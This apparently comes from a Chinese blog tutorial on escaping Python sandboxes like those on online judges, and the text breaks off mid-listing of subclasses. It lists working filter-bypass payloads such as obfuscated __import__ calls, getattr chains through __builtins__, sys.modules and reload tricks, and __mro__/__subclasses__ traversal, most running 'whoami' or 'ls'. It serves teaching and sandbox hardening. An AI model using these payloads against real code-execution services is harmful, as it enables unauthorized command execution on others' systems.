+<p>如果 oj 支持 <code>import</code> 的话，这些库都是高危的，放任不管基本上是坐等被日。所以为了避免过滤不完善导致各种问题，在 Python 沙箱套一层 docker 肯定不会是坏事。</p>
+<h3 id="花式-import">花式 import</h3>
+<p>首先，禁用 <code>import os</code> 肯定是不行的，因为<br />
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">import</span>  os<br><span class="hljs-keyword">import</span>   os<br><span class="hljs-keyword">import</span>    os<br>...<br></code></pre></td></tr></table></figure><br />
+都可以。如果多个空格也过滤了，Python 能够 import 的可不止 <code>import</code>，还有 <code>__import__</code>：<code>__import__('os')</code>，<code>__import__</code>被干了还有 <code>importlib</code>：<code>importlib.import_module('os').system('ls')</code></p>
+<p>这样就安全了吗？实际上<code>import</code>可以通过其他方式完成。回想一下 import 的原理，本质上就是执行一遍导入的库。这个过程实际上可以用 <code>execfile</code> 来代替：<br />
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">execfile</span><span class="hljs-params">(<span class="hljs-string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-string">&#x27;ls&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><br />
+不过要注意，2.x 才能用，3.x 删了 execfile，不过可以这样：<br />
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">with <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/usr/lib/python3.6/os.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) as f:<br>    <span class="hljs-built_in">exec</span>(f<span class="hljs-selector-class">.read</span>())<br><br><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-string">&#x27;ls&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><br />
+这个方法倒是 2.x、3.x 通用的。</p>
+<p>不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 sys 没被干掉的话，还可以确认一下，：<br />
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import sys<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(sys.path)</span></span><br></code></pre></td></tr></table></figure></p>
+<h3 id="花式处理字符串">花式处理字符串</h3>
+<p>代码中要是出现 <code>os</code>，直接不让运行。那么可以利用字符串的各种变化来引入 os：<br />
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;so&#x27;</span><span class="hljs-selector-attr">[::-1]</span>)<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">b</span> = <span class="hljs-string">&#x27;o&#x27;</span><br><span class="hljs-selector-tag">a</span> = <span class="hljs-string">&#x27;s&#x27;</span><br><span class="hljs-built_in">__import__</span>(a+b)<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<p>还可以利用 <code>eval</code> 或者 <code>exec</code>：<br />
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&gt;&gt;&gt; eval(&#x27;)<span class="hljs-string">&quot;imaohw&quot;</span>(<span class="hljs-name">metsys</span>.)<span class="hljs-string">&quot;so&quot;</span>(<span class="hljs-name">__tropmi__</span>&#x27;[:<span class="hljs-symbol">:-1</span>])<br>macr0phag3<br><span class="hljs-number">0</span><br>&gt;&gt;&gt; exec(&#x27;)<span class="hljs-string">&quot;imaohw&quot;</span>(<span class="hljs-name">metsys</span>.so <span class="hljs-comment">;so tropmi&#x27;[::-1])</span><br>macr0phag3<br></code></pre></td></tr></table></figure></p>
+<p>eval、exec 都是相当危险的函数，exec 比 eval 还要危险，它们一定要过滤，因为字符串有很多变形的方式，对字符串的处理可以有：逆序、拼接、base64、hex、rot13...等等，太多了。。。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>] == <br>[<span class="hljs-string">&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;</span>] == <br>[<span class="hljs-string">u&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;</span>] == <br>[<span class="hljs-string">&#x27;X19idWlsdGluc19f&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)] == <br>[<span class="hljs-string">&#x27;__buil&#x27;</span>+<span class="hljs-string">&#x27;tins__&#x27;</span>] == <br>[<span class="hljs-string">&#x27;__buil&#x27;</span><span class="hljs-string">&#x27;tins__&#x27;</span>] == <br>[<span class="hljs-string">&#x27;__buil&#x27;</span>.__add__(<span class="hljs-string">&#x27;tins__&#x27;</span>)] == <br>[<span class="hljs-string">&quot;_builtins_&quot;</span>.join(<span class="hljs-string">&quot;__&quot;</span>)] == <br>[<span class="hljs-string">&#x27;%c%c%c%c%c%c%c%c%c%c%c%c&#x27;</span> % (<span class="hljs-number">95</span>, <span class="hljs-number">95</span>, <span class="hljs-number">98</span>, <span class="hljs-number">117</span>, <span class="hljs-number">105</span>, <span class="hljs-number">108</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">115</span>, <span class="hljs-number">95</span>, <span class="hljs-number">95</span>)]<br>...<br></code></pre></td></tr></table></figure>
+<p>你看看最后那个格式化字符串，这不是直接起飞？啥字符构造不了？</p>
+<h3 id="恢复-sys.modules">恢复 sys.modules</h3>
+<p><code>sys.modules</code> 是一个字典，里面储存了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 <code>os</code> 是默认被加载进来的，但是不能直接使用（但是可以通过 <code>sys.modules</code> 来使用，例如 <code>sys.modules["os"]</code>），原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。</p>
+<p>如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：<br />
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&gt;&gt;&gt; sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-keyword">import</span> os<br>&gt;&gt;&gt; os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>Traceback (most recent <span class="hljs-keyword">call</span> last):<br>  File &quot;&lt;stdin&gt;&quot;, <span class="hljs-type">line</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>AttributeError: <span class="hljs-string">&#x27;str&#x27;</span> <span class="hljs-keyword">object</span> has <span class="hljs-keyword">no</span> <span class="hljs-keyword">attribute</span> <span class="hljs-string">&#x27;system&#x27;</span><br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure></p>
+<p>注意，这里不能用 <code>del sys.modules['os']</code>，因为，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。</p>
+<p>所以删了 <code>sys.modules['os']</code> 只会让 Python 重新加载一次 os。</p>
+<p>看到这你肯定发现了，对于上面的过滤方式，绕过的方式可以是这样：<br />
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span> # oj 为你加的<br><br>del sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>]<br><span class="hljs-keyword">import</span> os<br>os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>最后还有一种利用 <code>__builtins__</code> 导入的方式，下面会详细说。</p>
+<h3 id="花式执行函数">花式执行函数</h3>
+<p>通过上面内容我们很容易发现，光引入 os 只不过是第一步，如果把 system 这个函数干掉，也没法通过<code>os.system</code>执行系统命令，并且这里的<code>system</code>也不是字符串，也没法直接做编码等等操作。我遇到过一个环境，直接在<code>/usr/lib/python2.7/os.py</code>中删了<code>system</code>函数。。。</p>
+<p>不过，要明确的是，os 中能够执行系统命令的函数有很多：<br />
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.system(<span class="hljs-string">&#x27;whoami&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()) <br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.popen2(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()) # <span class="hljs-number">2.</span>x<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.popen3(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()) # <span class="hljs-number">2.</span>x<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.popen4(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()) # <span class="hljs-number">2.</span>x<br>...<br></code></pre></td></tr></table></figure><br />
+应该还有一些，可以在这里找找：<br />
+<a target="_blank" rel="noopener" href="https://docs.python.org/2/library/os.html">2.x 传送门🚪</a><br />
+<a target="_blank" rel="noopener" href="https://docs.python.org/3/library/os.html">3.x 传送门🚪</a><br />
+过滤<code>system</code>的时候说不定还有其他函数给漏了。</p>
+<p>其次，可以通过 <code>getattr</code> 拿到对象的方法、属性：<br />
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import os<br><span class="hljs-function"><span class="hljs-title">getattr</span><span class="hljs-params">(os, <span class="hljs-string">&#x27;metsys&#x27;</span>[::-<span class="hljs-number">1</span>])</span><span class="hljs-params">(<span class="hljs-string">&#x27;whoami&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure></p>
+<p>不让出现 import 也没事：<br />
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&gt;&gt;&gt; getattr(<span class="hljs-name">getattr</span>(<span class="hljs-name">__builtins__</span>, &#x27;__tropmi__&#x27;[:<span class="hljs-symbol">:-1</span>])(&#x27;so&#x27;[:<span class="hljs-symbol">:-1</span>]), &#x27;metsys&#x27;[:<span class="hljs-symbol">:-1</span>])(&#x27;whoami&#x27;)<br>macr0phag3<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure></p>
+<p>一样可以。这个方法同样可以用于逃逸过滤 import 的沙箱。关于 <code>__builtins__</code>，见下文。</p>
+<p>与 <code>getattr</code> 相似的还有 <code>__getattr__</code>、<code>__getattribute__</code>，它们自己的区别就是<code>getattr</code>相当于<code>class.attr</code>，都是获取类属性/方法的一种方式，在获取的时候会触发<code>__getattribute__</code>，如果<code>__getattribute__</code>找不到，则触发<code>__getattr__</code>，还找不到则报错。更具体的这里就不解释了，有兴趣的话可以搜搜。</p>
+<h3 id="builtins__builtin__与__builtins__">builtins、__builtin__与__builtins__</h3>
+<p>先说一下，<code>builtin</code>、<code>builtins</code>，<code>__builtin__</code>与<code>__builtins__</code>的区别：<br />
+首先我们知道，在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫<code>内建模块</code>（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。顺便说一下，Python 对函数、变量、类等等的查找方式是按 <code>LEGB</code> 规则来找的，其中 B 即代表内建模块，这里也不再赘述了，有兴趣的搜搜就明白了。</p>
+<p>在 2.x 版本中，内建模块被命名为 <code>__builtin__</code>，到了 3.x 就成了 <code>builtins</code>。它们都需要 import 才能查看：<br />
+2.x：<br />
+<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> __builtin__</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">__builtin__</span><br>&lt;module &#x27;__builtin__&#x27; (built-in)&gt;<br></code></pre></td></tr></table></figure></p>
+<p>3.x：<br />
+<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> builtins</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">builtins</span><br>&lt;module &#x27;builtins&#x27; (built-in)&gt;<br></code></pre></td></tr></table></figure></p>
+<p>但是，<code>__builtins__</code> 两者都有，实际上是<code>__builtin__</code>和<code>builtins</code> 的引用。它不需要导入，我估计是为了统一 2.x 和 3.x。不过<code>__builtins__</code>与<code>__builtin__</code>和<code>builtins</code>是有一点区别的，感兴趣的话建议查一下，这里就不啰嗦了。不管怎么样，<code>__builtins__</code> 相对实用一点，并且在 <code>__builtins__</code>里有很多好东西：<br />
+<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;__import__&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">__builtins__.__dict__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)</span><br>macr0phag3<br>0<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;execfile&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)</span><br>True<br></code></pre></td></tr></table></figure></p>
+<p>这里稍微解释下 <code>x.__dict__</code> ，它是 x 内部所有属性名和属性值组成的字典，有以下特点：</p>
+<ol type="1">
+<li>内置的数据类型没有 <code>__dict__</code> 属性</li>
+<li>每个类有自己的 <code>__dict__</code> 属性，就算存着继承关系，父类的 <code>__dict__</code> 并不会影响子类的 <code>__dict__</code></li>
+<li>对象也有自己的 <code>__dict__</code> 属性，包含 <code>self.xxx</code> 这种实例属性</li>
+</ol>
+<p>那么既然<code>__builtins__</code>有这么多危险的函数，不如将里面的危险函数破坏了：<br />
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__builtins__</span>.<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;eval&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span><br></code></pre></td></tr></table></figure></p>
+<p>或者直接删了：<br />
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">del</span> __builtins__.__dict__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span><br></code></pre></td></tr></table></figure></p>
+<p>但是我们可以利用 <code>reload(__builtins__)</code> 来恢复 <code>__builtins__</code>。不过，我们在使用 <code>reload</code> 的时候也没导入，说明 <code>reload</code>也在 <code>__builtins__</code>里，那如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。还有一种情况是利用 <code>exec command in _global</code> 动态运行语句时的绕过，比如实现一个计算器的时候，在最后有给出例子。</p>
+<p>这里注意，2.x 的 <code>reload</code> 是内建的，3.x 需要 <code>import imp</code>，然后再 <code>imp.reload</code>。你看，reload 的参数是 <code>module</code>，所以肯定还能用于重新载入其他模块，这个放在下面说。</p>
+<h3 id="通过继承关系逃逸">通过继承关系逃逸</h3>
+<p>在 Python 中提到继承就不得不提 <code>mro</code>，<code>mro</code>就是方法解析顺序，因为 Python 支持多重继承，所以就必须有个方式判断某个方法到底是 A 的还是 B 的。2.2 之前是经典类，搜索是深度优先；经典类后来发展为新式类，使用广度优先搜索，再后来新式类的搜索变为 C3 算法；而 3.x 中新式类一统江湖，默认继承 <code>object</code>，当然也是使用的 C3 搜索算法。。。扯远了扯远了，感兴趣的可以搜搜。不管怎么说，总是让人去判断继承关系显然是反人类的，所以 Python 中新式类都有个属性，<code>.__mro__</code> 或 <code>.mro()</code>，是个元组，记录了继承关系：<br />
+<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-number">__</span><span class="hljs-keyword">class</span><span class="hljs-number">__._</span><span class="hljs-number">_m</span>ro<span class="hljs-number">__</span><br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br></code></pre></td></tr></table></figure><br />
+类的实例在获取 <code>__class__</code> 属性时会指向该实例对应的类。可以看到，<code>''</code>属于 <code>str</code>类，它继承了 <code>object</code> 类，这个类是所有类的超类。具有相同功能的还有<code>__base__</code>和<code>__bases__</code>。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：<br />
+<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-keyword">pass</span></span><br><span class="hljs-meta prompt_">...</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">test.__bases__</span><br>()<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>(<span class="hljs-title class_ inherited__">object</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-keyword">pass</span></span><br><span class="hljs-meta prompt_">...</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">test.__bases__</span><br>(&lt;type &#x27;object&#x27;&gt;,)<br></code></pre></td></tr></table></figure></p>
+<p>那么知道这个有什么用呢？</p>
+<p>由于没法直接引入 os，那么假如有个库叫<code>oos</code>，在<code>oos</code>中引入了<code>os</code>，那么我们就可以通过<code>__globals__</code>拿到 os。例如，<code>site</code> 这个库就有 <code>os</code>：<br />
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">&gt;&gt;&gt; <span class="hljs-keyword">import</span> site<br>&gt;&gt;&gt; site.<span class="hljs-built_in">os</span><br>&lt;<span class="hljs-built_in">module</span> <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/Users/macr0phag3/.pyenv/versions/3.6.5/lib/python3.6/os.py&#x27;</span>&gt;<br></code></pre></td></tr></table></figure></p>
+<p>怎么理解这个 <code>__globals__</code> 呢？它是函数所在的全局命名空间中所定义的全局变量。也就是只要是函数就会有这个属性。除了 <code>builtin_function_or_method</code> 或者是 <code>wrapper_descriptor</code> 、<code>method-wrapper</code> 类型的函数，例如 <code>range</code>、<code>range.__init__</code>、<code>''.split</code> 等等。</p>
+<p>那么也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 <code>import site</code>。可以利用 <code>reload</code>，变相加载 <code>os</code>：<br />
+<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> site</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">os</span><br>Traceback (most recent call last):<br>  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;<br>NameError: name &#x27;os&#x27; is not defined<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">os = reload(site.os)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)</span><br>macr0phag3<br>0<br></code></pre></td></tr></table></figure></p>
+<p>还有，既然所有的类都继承的<code>object</code>，那么我们先用<code>__subclasses__</code>看看它的子类，以 2.x 为例：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()): <span class="hljs-built_in">print</span> i<br>...<br>(<span class="hljs-number">0</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;)<br>(<span class="hljs-number">1</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;)<br>(<span class="hljs-number">2</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">3</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">4</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;)<br>(<span class="hljs-number">5</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;)<br>(<span class="hljs-number">6</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;)<br>(<span class="hljs-number">7</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;)<br>(<span class="hljs-number">8</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;)<br>(<span class="hljs-number">9</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;)<br>(<span class="hljs-number">10</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;)<br>(<span class="hljs-number">11</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;)<br>(<span class="hljs-number">12</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;)<br>(<span class="hljs-number">13</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;)<br>(<span class="hljs-number">14</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;)<br>(<span class="hljs-number">15</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;)<br>(<span class="hljs-number">16</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;)<br>(<span class="hljs-number">17</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;)<br>(<span class="hljs-number">18</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;)<br>(<span class="hljs-number">19</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;)<br>(<span class="hljs-number">20</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;)<br>(<span class="hljs-number">21</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;)<br>(<span class="hljs-number">22</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;)<br>(<span class="hljs-number">23</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;)<br>(<span class="hljs-number">24</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;)<br>(<span class="hljs-number">25</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;)<br>(<span class="hljs-number">26</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;)<br>(<span class="hljs-number">27</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;)<br>(<span class="hljs-number">28</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;)<br>(<span 